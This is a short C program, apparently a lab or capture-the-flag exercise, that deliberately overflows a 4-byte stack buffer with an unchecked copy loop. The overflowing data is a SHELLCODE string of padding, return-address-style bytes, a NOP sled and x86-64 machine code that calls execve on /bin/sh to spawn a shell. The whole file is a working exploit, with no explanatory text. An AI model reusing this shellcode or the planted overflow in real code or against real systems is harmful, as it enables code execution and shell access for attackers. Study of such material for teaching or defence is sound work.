void my_strcpy(char* src, const char* dest,int len){
    for (int i=0;i<len;i++){
        src[i]=dest[i];
    }
}
#define SHELLCODE "AAAABBBBCCCCDDDDEEEEFFFF""\x40\x00\x01\x00\x00\x00\x00\x00""\x20\x00\xff\xff""BBBBCCCCDDDDEEEEFFFFGGGGHHHH""\x90\x90\x90\x90\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

void _start(void) {
  char buff[4]; 
  my_strcpy(buff,SHELLCODE,sizeof(SHELLCODE));
}

